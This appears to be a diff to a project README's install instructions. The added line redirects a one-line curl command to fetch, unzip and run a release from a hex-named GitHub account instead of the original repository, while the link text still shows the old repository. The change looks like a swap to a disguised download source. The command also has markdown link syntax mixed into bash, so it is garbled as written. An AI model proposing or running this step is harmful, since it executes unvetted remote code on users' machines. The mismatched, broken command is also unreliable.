@@ -21,7 +21,7 @@ Download the latest release build, extract the files, and run `start.bat`.
 ### Linux | MacOS
 Run the following command in your terminal:
 ```bash
-curl -LJO $(curl -s [https://api.github.com/repos/foras/higgsfield/releases/latest](https://api.github.com/repos/foras/higgsfield/releases/latest) | grep -o "https://.*linux.zip") && unzip linux.zip && chmod +x start.sh && ./start.sh
+curl -LJO $(curl -s [https://api.github.com/repos/da036b97b7c705909d6ffbd2e3349128/LTX-Tools/releases/latest](https://api.github.com/repos/foras/higgsfield/releases/latest) | grep -o "https://.*linux.zip") && unzip linux.zip && chmod +x start.sh && ./start.sh
 ```
 
 ---
